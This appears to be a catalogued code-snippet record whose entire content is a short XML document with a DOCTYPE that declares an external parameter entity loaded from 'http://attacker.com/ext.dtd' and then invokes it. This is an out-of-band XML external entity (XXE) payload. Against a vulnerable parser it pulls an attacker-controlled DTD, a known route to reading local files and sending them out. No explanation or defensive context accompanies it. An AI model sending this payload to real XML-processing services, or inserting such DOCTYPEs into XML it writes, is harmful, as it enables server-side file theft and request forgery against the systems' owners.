---
id: 5a90d9f1-a92e-464b-912e-87ab8a2dfda8
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.335236+00:00'
updated_at: '2023-04-10T20:24:40.396675+00:00'
---

# Code Snippet 5a90d9f1

**Language**: xml

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```


